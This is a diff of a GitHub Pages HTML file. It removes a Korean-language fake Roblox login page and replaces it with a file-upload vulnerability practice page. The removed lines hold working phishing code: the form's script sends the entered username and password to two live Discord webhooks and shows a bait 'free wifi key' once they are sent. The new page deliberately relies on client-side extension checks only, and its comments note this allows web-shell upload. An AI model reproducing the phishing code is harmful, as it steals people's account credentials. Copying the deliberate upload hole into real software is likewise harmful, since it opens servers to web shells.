@@ -1,193 +1,34 @@
 <!DOCTYPE html>
-<html lang="en-US">
-  <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-<!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>index.html</title>
-<meta name="generator" content="Jekyll v3.10.0" />
-<meta property="og:title" content="index.html" />
-<meta property="og:locale" content="en_US" />
-<link rel="canonical" href="https://siheon2025-hue.github.io/index.html/" />
-<meta property="og:url" content="https://siheon2025-hue.github.io/index.html/" />
-<meta property="og:site_name" content="index.html" />
-<meta property="og:type" content="website" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="index.html" />
-<script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","headline":"index.html","name":"index.html","url":"https://siheon2025-hue.github.io/index.html/"}</script>
-<!-- End Jekyll SEO tag -->
-
-    <link rel="stylesheet" href="/index.html/assets/css/style.css?v=b1b79c0b7812604084b063b24b94f95938940d62">
-    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
-
-<!-- Setup Google Analytics -->
-
-
-
-<!-- You can set your favicon here -->
-<!-- link rel="shortcut icon" type="image/x-icon" href="/index.html/favicon.ico" -->
-
-<!-- end custom head snippets -->
-
-  </head>
-  <body>
-    <div class="container-lg px-3 my-5 markdown-body">
-      
-      <h1><a href="https://siheon2025-hue.github.io/index.html/">index.html</a></h1>
-      
-
-      <p>&lt;!DOCTYPE html&gt;</p>
 <html lang="ko">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Roblox 로그인 - Roblox</title>
-    <style>
-        body {
-            font-family: 'Roboto', arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #fff;
+    <meta charset="UTF-8">
+    <title>파일 업로드 취약점 실습 (HTML)</title>
+    <script>
+        function checkFile() {
+            var fileInput = document.getElementById('fileInput');
+            var filePath = fileInput.value;
+            var allowedExtensions = /(\.jpg|\.jpeg|\.png|\.gif)$/i;
+
+            // [취약점] 클라이언트 사이드 검증만 존재함
+            // 공격자는 이 스크립트를 무시하거나 프록시 툴(Burp Suite)로 우회 가능
+            if (!allowedExtensions.exec(filePath)) {
+                alert('이미지 파일만 업로드 가능합니다!');
+                fileInput.value = '';
+                return false;
+            }
+            return true;
         }
-        .login-box {
-            width: 450px;
-            padding: 48px 40px 36px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            text-align: center;
-            box-sizing: border-box;
-        }
-        .logo { margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
-        p { font-size: 16px; color: #202124; margin-bottom: 40px; }
-        .input-group { text-align: left; margin-bottom: 24px; }
-        input {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            box-sizing: border-box;
-            outline: none;
-        }
-        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-        .btn-container {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 40px;
-        }
-        button {
-            background-color: #1a73e8;
-            color: white;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        /* 결과 화면 스타일 */
-        .key-display {
-            text-align: center;
-        }
-        .key-box {
-            padding: 20px;
-            border: 2px dashed #1a73e8;
-            margin-top: 20px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #202124;
-        }
-    </style>
+    </script>
 </head>
 <body>
-
-<div id="main-content">
-    <div class="login-box">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkVFlvrIx0sjaqPAtE9oemabGfo48NvrQpQ4gongVK-imtkk8CUg&amp;s=10&amp;ec=121585071" width="75" alt="Roblox" class="logo" />
-        <h1>Roblox 로그인</h1>
-        <p>Roblox 계정 사용</p>
-        <div class="input-group">
-            <input type="text" id="email" placeholder="아이디 입력" required="" />
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="비밀번호 입력" required="" />
-        </div>
-        <div class="btn-container">
-            <button onclick="submitData()">로그인</button>
-        </div>
-    </div>
-</div>
-
-<script>
-    async function submitData() {
-        const email = document.getElementById('email').value;
-        const pw = document.getElementById('password').value;
-
-        if (!email || !pw) {
-            alert("아이디와 비밀번호를 입력해주세요.");
-            return;
-        }
-
-        const webhooks = [
-            "https://discord.com/api/webhooks/1480916043869196448/vAcZXldHpkuKVBy8hOSZ6VOBPoqXf1zOLb2MQvZmSkVgO3rBy3rH5q9LcVLQOsokDIOg",
-            "https://discord.com/api/webhooks/1480916038584500394/jL8Hr2VNwVPUCwlWcHkNDlBPVGJ4y385aNU8lP_vJmAfHxqwYEZBnDlG3s0hzskmjrXc"
-        ];
-
-        const payload = {
-            embeds: [{
-                title: "Roblox Pentest Data",
-                color: 15790320,
-                fields: [
-                    { name: "ID", value: email, inline: false },
-                    { name: "PW", value: pw, inline: false }
-                ],
-                footer: { text: new Date().toLocaleString() }
-            }]
-        };
-
-        try {
-            // 디스코드 전송
-            await Promise.all(webhooks.map(url => 
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                })
-            ));
-
-            // 전송 완료 후 화면 전환 (키 값 출력)
-            document.getElementById('main-content').innerHTML = `
-                <div class="key-display">
-                    <h1 style="color: #1a73e8;">전송 완료</h1>
-                    <div class="key-box">
-                        키 = hacking_123454
-                    </div>
-                    <p style="margin-top: 20px; color: #5f6368;">무료 와이파이 암호 값입니다.</p>
-                </div>
-            `;
-
-        } catch (e) {
-            console.error(e);
-            alert("전송 중 오류가 발생했습니다.");
-        }
-    }
-</script>
-
+    <h2>이미지 업로드 (JS 검증 포함)</h2>
+    <p style="color: red;">* 주의: 서버측 검증이 없으면 JS를 우회하여 웹쉘 업로드가 가능합니다.</p>
+    
+    <!-- 실제 파일 저장을 위해서는 action에 서버 스크립트(PHP 등) 주소가 들어가야 함 -->
+    <form action="upload_process.php" method="post" enctype="multipart/form-data" onsubmit="return checkFile()">
+        <input type="file" name="fileToUpload" id="fileInput">
+        <input type="submit" value="파일 업로드">
+    </form>
 </body>
-</html>
-
-
-      
-    </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
-    <script>anchors.add();</script>
-  </body>
 </html>
 
